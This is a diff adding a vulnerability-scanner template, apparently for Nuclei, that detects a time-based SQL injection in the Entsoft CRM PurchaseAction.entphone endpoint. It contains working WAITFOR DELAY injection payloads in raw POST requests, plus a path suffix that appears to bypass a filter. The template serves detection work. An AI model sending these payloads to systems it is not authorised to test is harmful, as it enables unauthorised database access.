@@ -1,0 +1,43 @@
+id: entersoft-customer-resource-management-sqli
+info:
+  name: "Entsoft Customer Resource Management System 中 PurchaseAction.entphone 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Entsoft
+  description: |
+    Detects a SQL Injection vulnerability in the Entsoft Customer Resource Management System (PurchaseAction.entphone).
+    The vulnerability is triggered by injecting a delay-based SQL payload and measuring the response time.
+
+http:
+  - raw:
+      - |
+        POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        modNum=1';WAITFOR DELAY '0:0:5'--+
+      - |
+        POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        modNum=1';WAITFOR DELAY '0:0:8'--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"state\":\"3\""
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
